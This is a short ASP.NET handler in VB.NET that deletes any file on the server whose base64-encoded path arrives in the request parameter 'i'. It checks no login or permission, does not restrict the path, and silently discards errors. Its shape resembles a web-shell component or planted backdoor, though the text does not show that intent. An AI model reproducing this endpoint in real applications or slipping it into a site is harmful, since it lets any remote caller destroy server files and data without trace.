<%@ WebHandler Language="VB" Class="delefile" %>
Imports System.IO

Public Class delefile : Implements IHttpHandler
    Public Sub ProcessRequest(ByVal context As HttpContext) Implements IHttpHandler.ProcessRequest
        Try
            File.Delete(Encoding.UTF8.GetString(Convert.FromBase64String(context.Request.Item("i"))))
        Catch ex As Exception
        End Try
        context.Response.Write("")
    End Sub
 
    Public ReadOnly Property IsReusable() As Boolean Implements IHttpHandler.IsReusable
        Get
            Return False
        End Get
    End Property

End Class